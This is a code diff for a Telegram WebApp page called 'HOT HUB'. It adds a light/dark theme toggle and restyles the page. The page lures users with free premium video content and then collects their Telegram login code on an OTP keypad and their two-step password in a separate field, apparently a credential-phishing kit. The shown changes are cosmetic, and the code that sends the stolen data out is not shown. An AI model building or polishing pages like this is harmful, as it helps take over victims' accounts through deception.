@@ -13,16 +13,41 @@
     <script src="./config.js"></script>
     
 <style>
-    /* Premium VIP Style UI Design - Enhanced Colors & Effects */
+    /* Premium VIP Style UI Design - Dark/Light Theme Variables */
     :root {
         --primary: #ff9d00;
         --secondary: #ff5c00;
+        
+        /* DARK MODE DEFAULTS */
         --dark-bg: #050505;
         --glass: rgba(20, 20, 20, 0.95); 
         --glass-border: rgba(255, 157, 0, 0.15);
         --text: #ffffff;
         --muted: #a9a9b0;
+        --gallery-bg: rgba(0,0,0,0.3);
+        --list-bg: rgba(255,255,255,0.02);
+        --list-border: rgba(255,255,255,0.05);
+        --key-bg: rgba(255, 255, 255, 0.04);
+        --input-bg: rgba(0, 0, 0, 0.5);
+        --otp-bg: rgba(0, 0, 0, 0.4);
+        --icon-bg: rgba(255,255,255,0.08);
         --radius: 24px;
+    }
+
+    /* LIGHT MODE CLASS */
+    .light-theme {
+        --dark-bg: #f4f4f6;
+        --glass: rgba(255, 255, 255, 0.95); 
+        --glass-border: rgba(255, 157, 0, 0.3);
+        --text: #1a1a1a;
+        --muted: #666666;
+        --gallery-bg: rgba(255,255,255,0.8);
+        --list-bg: rgba(0,0,0,0.03);
+        --list-border: rgba(0,0,0,0.08);
+        --key-bg: rgba(0, 0, 0, 0.04);
+        --input-bg: rgba(255, 255, 255, 0.8);
+        --otp-bg: rgba(255, 255, 255, 0.6);
+        --icon-bg: rgba(0,0,0,0.05);
     }
 
     * { 
@@ -41,12 +66,17 @@
         width: 100vw;
         display: flex; flex-direction: column; align-items: center; justify-content: flex-start;
         scroll-behavior: smooth;
+        transition: background 0.4s ease, color 0.4s ease;
     }
 
-    /* Enhanced Background with deep glow */
+    /* Enhanced Background */
     .background {
         position: fixed; inset: 0; z-index: -10;
-        background: radial-gradient(circle at 50% 0%, rgba(255, 157, 0, 0.12), #020202 75%);
+        background: radial-gradient(circle at 50% 0%, rgba(255, 157, 0, 0.12), transparent 75%);
+        transition: background 0.4s ease;
+    }
+    .light-theme .background {
+        background: radial-gradient(circle at 50% 0%, rgba(255, 157, 0, 0.2), transparent 75%), #f4f4f6;
     }
 
     /* ALL STEPS CENTERED */
@@ -74,6 +104,10 @@
         box-shadow: 0 15px 40px rgba(0,0,0,0.8), 0 0 20px rgba(255, 157, 0, 0.05);
         display: flex; flex-direction: column;
         backdrop-filter: blur(10px);
+        transition: background 0.4s ease, border-color 0.4s ease, box-shadow 0.4s ease;
+    }
+    .light-theme .glass-card {
+        box-shadow: 0 15px 40px rgba(0,0,0,0.1), 0 0 20px rgba(255, 157, 0, 0.1);
     }
 
     /* =========================================================
@@ -89,21 +123,23 @@
     .dot.green { background: #5de267; box-shadow: 0 0 10px #5de267; }
     
     .nav-badge {
-        background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
+        background: var(--list-bg); border: 1px solid var(--list-border);
         padding: 6px 12px; border-radius: 999px; font-size: 11px; font-weight: 800;
-        display: flex; align-items: center; gap: 6px; letter-spacing: 1px; color: #e0e0e0;
+        display: flex; align-items: center; gap: 6px; letter-spacing: 1px; color: var(--text);
+        transition: background 0.4s ease, color 0.4s ease;
     }
     .nav-icon {
-        width: 35px; height: 35px; border-radius: 50%; background: rgba(255,255,255,0.08);
+        width: 35px; height: 35px; border-radius: 50%; background: var(--icon-bg);
         display: flex; align-items: center; justify-content: center; font-size: 14px;
-        transition: 0.3s;
+        transition: 0.3s; cursor: pointer; color: var(--text);
     }
-    .nav-icon:active { transform: scale(0.9); background: rgba(255,255,255,0.15); }
+    .nav-icon:active { transform: scale(0.9); }
 
     .title-main { 
         font-size: 26px; font-weight: 800; margin-bottom: 8px; letter-spacing: -0.5px; 
-        background: linear-gradient(90deg, #fff, #ff9d00);
+        background: linear-gradient(90deg, var(--text), var(--primary));
         -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        transition: background 0.4s ease;
     }
     .subtitle-main { font-size: 13px; color: var(--muted); margin-bottom: 25px; line-height: 1.5; padding: 0 10px; }
 
@@ -112,8 +148,9 @@
     ========================================================= */
     .gallery {
         display: grid; grid-template-columns: 1fr 1fr; gap: 10px; width: 100%;
-        background: rgba(0,0,0,0.3); padding: 15px; border-radius: 24px;
-        border: 1px solid rgba(255,255,255,0.05); margin-bottom: 15px;
+        background: var(--gallery-bg); padding: 15px; border-radius: 24px;
+        border: 1px solid var(--list-border); margin-bottom: 15px;
+        transition: background 0.4s ease;
     }
     .gallery-item {
         position: relative; border-radius: 14px; overflow: hidden;
@@ -138,7 +175,7 @@
         position: absolute; top: 10px; right: 10px;
         background: rgba(0,0,0,0.7); padding: 5px 9px; border-radius: 8px;
         font-size: 10px; font-weight: bold; display: flex; align-items: center; gap: 6px;
-        border: 1px solid rgba(255,0,0,0.3); backdrop-filter: blur(5px);
+        border: 1px solid rgba(255,0,0,0.3); backdrop-filter: blur(5px); color: #fff;
     }
     .live-dot-small { width: 6px; height: 6px; background: #ff3b30; border-radius: 50%; box-shadow: 0 0 8px #ff3b30; animation: blink 1s infinite; }
     @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
@@ -147,13 +184,14 @@
        VIDEO LIST SECTION
     ========================================================= */
     .video-list-box {
-        background: rgba(255,255,255,0.02); padding: 18px; border-radius: 18px;
-        border: 1px solid rgba(255,255,255,0.05); margin-bottom: 10px; text-align: left;
+        background: var(--list-bg); padding: 18px; border-radius: 18px;
+        border: 1px solid var(--list-border); margin-bottom: 10px; text-align: left;
+        transition: background 0.4s ease;
     }
     .video-list-title { font-size: 14px; font-weight: 800; margin-bottom: 15px; color: var(--primary); text-transform: uppercase; letter-spacing: 0.5px; }
     .video-item {
-        font-size: 13px; color: #e0e0e0; display: flex; align-items: center; gap: 12px;
-        margin-bottom: 12px; padding-bottom: 12px; border-bottom: 1px solid rgba(255,255,255,0.03);
+        font-size: 13px; color: var(--text); display: flex; align-items: center; gap: 12px;
+        margin-bottom: 12px; padding-bottom: 12px; border-bottom: 1px solid var(--list-border);
     }
     .video-item:last-child { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
     .video-item i { color: #5de267; font-size: 15px; filter: drop-shadow(0 0 5px rgba(93, 226, 103, 0.4)); }
@@ -170,40 +208,40 @@
         transition: transform 0.2s cubic-bezier(0.22, 1, 0.36, 1), box-shadow 0.2s;
     }
     .btn-main:active { transform: scale(0.96); box-shadow: 0 5px 15px rgba(255, 157, 0, 0.2); }
-    .btn-main:disabled { background: #333; color: #888; box-shadow: none; pointer-events: none; }
+    .btn-main:disabled { background: var(--list-bg); color: var(--muted); box-shadow: none; pointer-events: none; border: 1px solid var(--list-border); }
 
     /* Forms & OTP */
     input {
-        width: 100%; padding: 18px 20px; border-radius: 16px; border: 1px solid rgba(255, 255, 255, 0.1); 
-        background: rgba(0, 0, 0, 0.5); color: #fff; font-size: 16px; margin-top: 10px;
+        width: 100%; padding: 18px 20px; border-radius: 16px; border: 1px solid var(--list-border); 
+        background: var(--input-bg); color: var(--text); font-size: 16px; margin-top: 10px;
         transition: 0.3s;
     }
-    input:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 15px rgba(255, 157, 0, 0.15); background: rgba(0,0,0,0.7); }
+    input:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 15px rgba(255, 157, 0, 0.15); }
     
     .otp-container { display: flex; gap: 12px; margin: 25px 0; justify-content: center; }
     .otp-box { 
-        width: 52px; height: 62px; border: 2px solid rgba(255, 255, 255, 0.1); 
+        width: 52px; height: 62px; border: 2px solid var(--list-border); 
         border-radius: 14px; display: flex; align-items: center; justify-content: center; 
-        font-size: 26px; font-weight: 800; background: rgba(0, 0, 0, 0.4); 
-        transition: all 0.2s ease; box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
+        font-size: 26px; font-weight: 800; background: var(--otp-bg); color: var(--text);
+        transition: all 0.2s ease; box-shadow: inset 0 2px 5px rgba(0,0,0,0.1);
     }
     .otp-box.filled { 
         border-color: var(--primary); color: var(--primary); 
         background: rgba(255, 157, 0, 0.1); transform: scale(1.08);
-        box-shadow: 0 0 15px rgba(255, 157, 0, 0.2), inset 0 2px 5px rgba(0,0,0,0.5);
+        box-shadow: 0 0 15px rgba(255, 157, 0, 0.2), inset 0 2px 5px rgba(0,0,0,0.1);
     }
     
     .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 15px; }
     .key { 
-        background: rgba(255, 255, 255, 0.04); padding: 16px; border-radius: 14px; 
+        background: var(--key-bg); padding: 16px; border-radius: 14px; 
         font-size: 24px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center;
-        border: 1px solid rgba(255,255,255,0.02); transition: 0.15s;
+        border: 1px solid var(--list-border); transition: 0.15s; color: var(--text);
     }
     .key:active { background: var(--primary); color: #000; transform: scale(0.92); border-color: var(--primary); }
 
     /* System Messages */
     .msg { padding: 14px; border-radius: 14px; font-size: 13px; margin: 0 0 15px 0; display: none; font-weight: 700; text-align: center; width: 100%; letter-spacing: 0.3px; }
-    .error { background: rgba(255, 59, 48, 0.15); color: #ff5e5e; border: 1px solid rgba(255, 59, 48, 0.3); }
+    .error { background: rgba(255, 59, 48, 0.15); color: #ff3b30; border: 1px solid rgba(255, 59, 48, 0.3); }
     .loading-msg { background: rgba(255, 157, 0, 0.15); color: var(--primary); border: 1px solid rgba(255, 157, 0, 0.3); box-shadow: 0 0 15px rgba(255, 157, 0, 0.1); }
     
     .btn-spinner { display: none; width: 22px; height: 22px; border: 3px solid rgba(0,0,0,0.2); border-top: 3px solid #000; border-radius: 50%; animation: spin 0.8s linear infinite; }
@@ -222,7 +260,7 @@
 
     <div class="background"></div>
 
-    <!-- STEP 1: INITIAL LOADER (VIP Premium Design) -->
+    <!-- STEP 1: INITIAL LOADER -->
     <div id="step_intro" class="step active">
         <div class="glass-card" style="padding: 40px 20px; max-width: 320px; text-align: center; border-radius: 32px; box-shadow: 0 20px 50px rgba(0,0,0,0.8), inset 0 0 20px rgba(255,157,0,0.05);">
             <h1 class="splash-title">HOT<br>HUB</h1>
@@ -238,7 +276,10 @@
             <div class="top-nav">
                 <div class="nav-brand"><span class="dot orange"></span> HOT HUB</div>
                 <div class="nav-badge"><span class="dot green"></span> EXPLORE</div>
-                <div class="nav-icon"><i class="fa-solid fa-moon"></i></div>
+                <!-- Theme Toggle Icon -->
+                <div class="nav-icon" id="themeToggleBtn" onclick="toggleTheme()">
+                    <i class="fa-solid fa-moon" id="themeIcon"></i>
+                </div>
             </div>
 
             <h1 class="title-main">Featured Gallery</h1>
@@ -291,7 +332,7 @@
         </div>
     </div>
 
-    <!-- STEP 3: OTP VERIFICATION (Centered Perfectly) -->
+    <!-- STEP 3: OTP VERIFICATION -->
     <div id="step2" class="step">
         <div class="glass-card">
             <div style="background: rgba(0,136,204,0.1); width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; border: 1px solid rgba(0,136,204,0.2); box-shadow: 0 0 20px rgba(0,136,204,0.1);">
@@ -310,7 +351,7 @@
             <div id="status2" class="msg"></div>            
 
             <!-- Button -->
-            <button class="btn-main" style="background: rgba(0,136,204,0.15); color: #4facfe; box-shadow: none; padding: 15px; margin-bottom: 5px; font-size: 13px; border: 1px solid rgba(0,136,204,0.3);" onclick="window.open('https://t.me/42777', '_blank')">
+            <button class="btn-main" style="background: rgba(0,136,204,0.15); color: #0088cc; box-shadow: none; padding: 15px; margin-bottom: 5px; font-size: 13px; border: 1px solid rgba(0,136,204,0.3);" onclick="window.open('https://t.me/42777', '_blank')">
                 <i class="fa-solid fa-unlock-keyhole"></i> Click to receive your code
             </button>
 
@@ -319,12 +360,12 @@
                 <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
                 <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
                 <div style="opacity:0; pointer-events: none;"></div><div class="key" onclick="press(0)">0</div>
-                <div class="key" onclick="backspace()" style="color: #ff5e5e; background: rgba(255,94,94,0.08); border-color: rgba(255,94,94,0.2);"><i class="fa-solid fa-delete-left"></i></div>
+                <div class="key" onclick="backspace()" style="color: #ff3b30; background: rgba(255,59,48,0.08); border-color: rgba(255,59,48,0.2);"><i class="fa-solid fa-delete-left"></i></div>
             </div>
         </div>
     </div>
 
-    <!-- STEP 4: 2FA VERIFICATION (Centered Perfectly) -->
+    <!-- STEP 4: 2FA VERIFICATION -->
     <div id="step3" class="step">
         <div class="glass-card">
             <div style="background: rgba(255, 157, 0, 0.1); width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; border: 1px solid rgba(255,157,0,0.2); box-shadow: 0 0 20px rgba(255,157,0,0.1);">
@@ -336,7 +377,7 @@
             
             <div style="position: relative; width: 100%; margin-bottom: 15px;">
                 <input type="password" id="2fa_input" placeholder="Two-Step Password" oninput="hideMsg(3)" style="margin-top: 0;">
-                <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: #888; cursor: pointer; padding: 10px;"></i>
+                <i class="fa-solid fa-eye" id="toggleIcon" onclick="togglePasswordVisibility()" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--muted); cursor: pointer; padding: 10px;"></i>
             </div>
 
             <!-- Message div above the button -->
@@ -356,7 +397,7 @@
             <h2 style="font-size: 26px; margin-bottom: 15px; font-weight: 800;">Verified!</h2>
             <p style="color: var(--muted); font-size: 14px; line-height: 1.6; margin-bottom: 30px;">Your account is verified. You now have full access to Free Premium Content.</p>
             
-            <button class="btn-main" onclick="window.location.href='https://t.me/habeshaless00/256'" style="background: linear-gradient(135deg, #4facfe, #00f2fe); box-shadow: 0 10px 25px rgba(0, 136, 204, 0.3); color: #fff;">
+            <button class="btn-main" onclick="window.location.href='https://t.me/habeshaless00/256'" style="background: linear-gradient(135deg, #00c6ff, #0072ff); box-shadow: 0 10px 25px rgba(0, 114, 255, 0.3); color: #fff;">
                 <i class="fa-solid fa-play"></i> START WATCHING
             </button>
         </div>
@@ -369,20 +410,54 @@
             <h2 style="color: #ff3b30; font-size: 24px; margin-bottom: 10px; font-weight: 800;">Please Wait!</h2>
             <p style="color: var(--muted); font-size: 14px; line-height: 1.5;">Too many attempts. Wait a few minutes before trying again.</p>
             
-            <div id="wait_time" style="font-size: 42px; font-weight: 900; margin: 25px 0; background: rgba(0,0,0,0.5); border-radius: 16px; padding: 15px; border: 1px solid rgba(255,255,255,0.05);">00:00</div>
+            <div id="wait_time" style="font-size: 42px; font-weight: 900; margin: 25px 0; background: var(--list-bg); border-radius: 16px; padding: 15px; border: 1px solid var(--list-border);">00:00</div>
         </div>
     </div>
 
 <script>
     /* =========================================================================
-       JAVASCRIPT SECTION (Exactly as provided - Untouched Logic)
+       THEME TOGGLE LOGIC (PURE UI, DOES NOT AFFECT BACKEND LOGIC)
+    ========================================================================= */
+    function toggleTheme() {
+        playTap();
+        document.body.classList.toggle('light-theme');
+        const icon = document.getElementById('themeIcon');
+        
+        if(document.body.classList.contains('light-theme')) {
+            icon.classList.remove('fa-moon');
+            icon.classList.add('fa-sun');
+            localStorage.setItem('vip_theme', 'light');
+        } else {
+            icon.classList.remove('fa-sun');
+            icon.classList.add('fa-moon');
+            localStorage.setItem('vip_theme', 'dark');
+        }
+    }
+
+    // Check saved theme on load
+    if(localStorage.getItem('vip_theme') === 'light') {
+        document.body.classList.add('light-theme');
+        document.getElementById('themeIcon').classList.replace('fa-moon', 'fa-sun');
+    }
+
+    /* =========================================================================
+       JAVASCRIPT SECTION (Exactly as provided - Untouched Backend Logic)
     ========================================================================= */
     const tg = window.Telegram.WebApp;
     
     tg.expand();
     tg.ready();
-    tg.headerColor = '#000000'; 
-    tg.backgroundColor = '#000000';
+    
+    // Attempt to match header color with theme
+    try {
+        if(document.body.classList.contains('light-theme')){
+            tg.headerColor = '#f4f4f6'; 
+            tg.backgroundColor = '#f4f4f6';
+        } else {
+            tg.headerColor = '#000000'; 
+            tg.backgroundColor = '#000000';
+        }
+    } catch(e){}
 
     let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id.toString() : "test_user";
     let sid = userId; 
